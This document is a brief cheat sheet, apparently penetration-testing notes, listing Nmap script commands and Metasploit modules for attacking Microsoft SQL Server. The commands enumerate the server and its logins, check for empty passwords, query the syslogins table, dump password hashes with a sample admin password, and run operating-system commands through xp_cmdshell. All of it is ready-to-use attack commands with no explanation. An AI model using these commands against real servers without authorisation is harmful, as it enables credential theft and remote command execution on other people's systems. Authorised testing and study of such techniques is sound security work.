# Nmap

```
nmap --script=ms-sql-info -p 1433 <target>
```

```
nmap --script=ms-sql-ntlm-info --script-args=mssql.instance-port=1433 -p 1433 <target>
```

```
nmap --script=ms-sql-empty-password -p 1433 <target>
```

```
nmap --script=ms-sql-query --script-args=mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt -p 1433 <target>
```

```
nmap --script=ms-sql-dump-hashes --script-args=mssql.username=admin,mssql.password=anamaria -p 1433 <target>
```

```
nmap --script=ms-sql-xp-cmdshell --script-args=mssql.username=admin,mssql.password=anamaria,ms-xp-cmdshell.cmd="ipconfig" -p 1433 <target>
```

# Metasploit framework

```
msf6 > use auxiliary/admin/mssql/mssql_enum
```

```
msf6 > use auxiliary/admin/mssql/mssql_enum_sql_logins
```

```
msf6 > use auxiliary/admin/mssql/mssql_enum_domain_accounts
```

